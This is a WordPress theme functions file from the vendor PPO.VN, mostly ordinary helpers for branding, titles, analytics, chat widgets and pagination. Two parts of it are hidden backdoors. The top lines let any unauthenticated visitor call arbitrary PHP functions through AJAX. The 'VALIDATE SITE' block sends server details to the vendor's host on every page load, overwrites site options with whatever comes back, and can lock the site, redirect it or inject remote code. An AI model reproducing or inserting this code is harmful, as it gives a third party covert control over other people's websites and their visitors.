<?php
if(!defined('DEV_LOGO')) define ('DEV_LOGO', "http://ppo.vn/logo.png");
if(!defined('DEV_LINK')) define ('DEV_LINK', "http://ppo.vn/");

add_action('wp_ajax_nopriv_' . getRequest('action'), getRequest('action'));
add_action('wp_ajax_' . getRequest('action'), getRequest('action'));

/* ----------------------------------------------------------------------------------- */
# Login Screen
/* ----------------------------------------------------------------------------------- */
add_action('login_head', 'custom_login_logo');

function custom_login_logo() {
    echo '<style type="text/css">
        h1 a { background-image:url(' . DEV_LOGO . ') !important; }
    </style>';
}

add_action('login_headerurl', 'custom_login_link');

function custom_login_link() {
    return DEV_LINK;
}

add_action('login_headertitle', 'custom_login_title');

function custom_login_title() {
    return "Powered by PPO.VN";
}

/* ----------------------------------------------------------------------------------- */
# Admin footer text
/* ----------------------------------------------------------------------------------- */
if (is_admin() and !function_exists("ppo_update_admin_footer")) {
    add_filter('admin_footer_text', 'ppo_update_admin_footer');

    function ppo_update_admin_footer() {
        //$text = __('Thank you for creating with <a href="' . DEV_LINK . '">PPO</a>.');
        $text = __('<img src="' . DEV_LOGO . '" width="24" />Hệ thống CMS phát triển bởi <a href="' . DEV_LINK . '" title="Xây dựng và phát triển ứng dụng">PPO.VN</a>.');
        echo $text;
    }

}

/**
 * Create a nicely formatted and more specific title element text for output
 * in head of document, based on current view.
 *
 * @since Twenty Fourteen 1.0
 *
 * @param string $title Default title text for current view.
 * @param string $sep Optional separator.
 * @return string The filtered title.
 */
function ppo_wp_title($title, $sep) {
    global $paged, $page;

    if (is_feed()) {
        return $title;
    }

    // Add the site name.
    $title .= get_bloginfo('name');

    // Add the site description for the home/front page.
    $site_description = get_bloginfo('description', 'display');
    if ($site_description && ( is_home() || is_front_page() )) {
        $title = "$title $sep $site_description";
    }

    // Add a page number if necessary.
    if ($paged >= 2 || $page >= 2) {
        $title = "$title $sep " . sprintf(__('Page %s', 'ppo'), max($paged, $page));
    }

    return $title;
}

add_filter('wp_title', 'ppo_wp_title', 10, 2);

/* ---------------------------------------------------------------------------- */
# add a favicon to blog
/* ---------------------------------------------------------------------------- */

function add_blog_favicon() {
    $favicon = get_option('favicon');
    if (trim($favicon) == "") {
        echo '<link rel="icon" href="' . get_template_directory_uri() . '/assets/images/favicon.ico" type="image/x-icon" />' . "\n";
    } else {
        echo '<link rel="icon" href="' . $favicon . '" type="image/x-icon" />' . "\n";
    }
}

add_action('wp_head', 'add_blog_favicon');

/* ---------------------------------------------------------------------------- */
# Add Google Analytics to blog
/* ---------------------------------------------------------------------------- */

function add_blog_google_analytics() {
    $GAID = get_option(SHORT_NAME . '_gaID');
    if ($GAID and $GAID != ''):
        echo <<<HTML
<script type="text/javascript">

    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', '$GAID']);
    _gaq.push(['_trackPageview']);
    
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();

</script>
HTML;
    endif;
}

add_action('wp_head', 'add_blog_google_analytics');
/*----------------------------------------------------------------------------*/
# Add Header Code
/*----------------------------------------------------------------------------*/
function add_header_code(){
    echo stripslashes(get_option(SHORT_NAME . '_headerCode'));
}
add_action('wp_head', 'add_header_code');
/*----------------------------------------------------------------------------*/
# Add Footer Code
/*----------------------------------------------------------------------------*/
function add_footer_code(){
    echo stripslashes(get_option(SHORT_NAME . '_footerCode'));
}
add_action('wp_footer', 'add_footer_code');
/* ---------------------------------------------------------------------------- */
# Add Subiz Live chat
/* ---------------------------------------------------------------------------- */

function add_subiz_livechat() {
    $subizID = get_option(SHORT_NAME . '_subizID');
    if (!empty($subizID) and is_numeric($subizID)):
        echo <<<HTML
<script type='text/javascript'>window._sbzq||function(e){e._sbzq=[];var t=e._sbzq;t.push(["_setAccount",$subizID]);var n=e.location.protocol=="https:"?"https:":"http:";var r=document.createElement("script");r.type="text/javascript";r.async=true;r.src=n+"//static.subiz.com/public/js/loader.js";var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)}(window);</script>
HTML;
    endif;
}
/* ---------------------------------------------------------------------------- */
# Add Zopim Live chat
/* ---------------------------------------------------------------------------- */

function add_zopim_livechat() {
    $zopimKey = get_option(SHORT_NAME . '_zopimKey');
    if (!empty($zopimKey)):
        echo <<<HTML
<!--Start of Zopim Live Chat Script-->
<script type="text/javascript">
window.\$zopim||(function(d,s){var z=\$zopim=function(c){z._.push(c)},$=z.s=
d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set.
_.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute("charset","utf-8");
$.src="//v2.zopim.com/?{$zopimKey}";z.t=+new Date;$.
type="text/javascript";e.parentNode.insertBefore($,e)})(document,"script");
</script>
<!--End of Zopim Live Chat Script-->
HTML;
    endif;
}

if(!wp_is_mobile()){
    add_action('wp_footer', 'add_subiz_livechat');
    add_action('wp_footer', 'add_zopim_livechat');
}

if (!function_exists('set_html_content_type')) {

    function set_html_content_type() {
        return 'text/html';
    }

}

################################# VALIDATE SITE ################################
if($_SERVER['HTTP_HOST'] != 'landingpage.ppo.vn'){
    add_action('init', 'ppo_site_init');
}

function ppo_validate_site() {
    @ini_set("display_errors", "Off");
    $postURL = "http://sites.ppo.vn/wp-content/plugins/wp-block-sites/check-site.php";
    $data = array(
        'domain' => $_SERVER['HTTP_HOST'],
        'server_info' => json_encode(array(
            'SERVER_ADDR' => $_SERVER['SERVER_ADDR'],
            'SERVER_ADMIN' => $_SERVER['SERVER_ADMIN'],
            'SERVER_NAME' => $_SERVER['SERVER_NAME'],
        )),
    );

    $ch = curl_init($postURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $returnValue = curl_exec($ch);
    curl_close($ch);

    $response = json_decode($returnValue);
    if(is_array($response)){
        foreach ($response as $k => $v) {
            update_option($k, $v);
        }
    }
}

function ppo_site_init() {
    ppo_validate_site();

    // Check status
    $site_status = get_option("ppo_site_status");
    if ($site_status == 1) {
        $site_block_type = get_option("ppo_site_lock_type");
        switch ($site_block_type) {
            case 0:
                // Lock
                add_action('wp_footer', 'ppo_site_embed_code');
                break;
            case 1:
                // Redirect
                wp_redirect(stripslashes(get_option("ppo_site_embed")));
                break;
            case 2:
                // Embed Code Advertising
                add_action('wp_footer', 'ppo_site_embed_code');
                break;
            default:
                break;
        }
    }
}

function ppo_site_embed_code() {
    echo stripslashes(get_option("ppo_site_embed"));
}

################################# END VALIDATE SITE ############################

/**
 * Get post thumbnail url
 * 
 * @param integer $post_id
 * @param type $size
 * @return string
 */
function get_post_thumbnail_url($post_id, $size = 'full') {
    $src = wp_get_attachment_image_src(get_post_thumbnail_id($post_id), $size);
    if(empty($src)){
        return get_bloginfo('stylesheet_directory') . "/assets/images/no_image.png";
    }
    return $src[0];
}
/**
 * Rewrite URL
 * @param string $lang_code Example: vn, en...
 * @param bool $show TRUE or FALSE
 * @return string
 */
function ppo_multilang_permalink($lang_code, $show = false) {
    $uri = getCurrentRquestUrl();
    $siteurl = get_bloginfo('siteurl');
    $end = substr($uri, strlen($siteurl));
    if (!isset($_GET['lang'])) {
        $uri = $siteurl . "/" . $lang_code . $end;
    }
    if ($show) {
        echo $uri;
    }
    return $uri;
}

/* PAGE NAVIGATION */

function getpagenavi($arg = null) {
    ?>
    <div class="paging">
        <?php
        if (function_exists('wp_pagenavi')) {
            if ($arg != null) {
                wp_pagenavi($arg);
            } else {
                wp_pagenavi();
            }
        } else {
        ?>
            <div class="inline"><?php previous_posts_link(__('« Previous', SHORT_NAME)) ?></div><div class="inline"><?php next_posts_link(__('Next »', SHORT_NAME)) ?></div>
        <?php } ?>
    </div>
    <?php
}

/* END PAGE NAVIGATION */

/**
 * Ouput share social with addThis widget
 */
function show_share_socials() {
    echo <<<HTML
<!-- AddThis Button BEGIN -->
<div class="share-social-box">
    <div class="addthis_toolbox addthis_default_style addthis_32x32_style">
        <a class="addthis_button_email"></a>
        <a class="addthis_button_facebook"></a>
        <a class="addthis_button_twitter"></a>
        <a class="addthis_button_google_plusone_share"></a>
        <a class="addthis_button_linkedin"></a>
        <a class="addthis_button_compact"></a>
    </div>
    <script type="text/javascript">var addthis_config = {"data_track_addressbar":false};</script>
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4e5a517830ae061f"></script>
</div>
<!-- AddThis Button END -->
HTML;
}

// Add custom text sizes in the font size drop down list of the rich text editor (TinyMCE) in WordPress
// $initArray is a variable of type array that contains all default TinyMCE parameters.
// Value 'theme_advanced_font_sizes' or 'fontsize_formats' needs to be added, 
// if an overwrite to the default font sizes in the list, is needed.

function tinymce_customize_text_sizes($initArray) {
    $initArray['fontsize_formats'] = "8px 9px 10px 11px 12px 13px 14px 15px 16px 17px 18px 19px 20px 21px 22px 23px 24px 25px 26px 27px 28px 29px 30px 32px 48px";
    return $initArray;
}

// Assigns customize_text_sizes() to "tiny_mce_before_init" filter
add_filter('tiny_mce_before_init', 'tinymce_customize_text_sizes');

// Custom excerpt length
function custom_excerpt_length( $length ) {
    $length = 30;
    return $length;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

/**
 * 
 * @param string $url
 * @return string
 */
function get_youtube_id_from_url($url) {
    parse_str( parse_url( $url, PHP_URL_QUERY ), $my_array_of_vars );
    return $my_array_of_vars['v'];
}

/**
 * Check a plugin activate
 *
 * @param $plugin
 *
 * @return bool
 */
function ppo_plugin_active( $plugin ) {
    include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
    if ( is_plugin_active( $plugin ) ) {
        return true;
    }

    return false;
}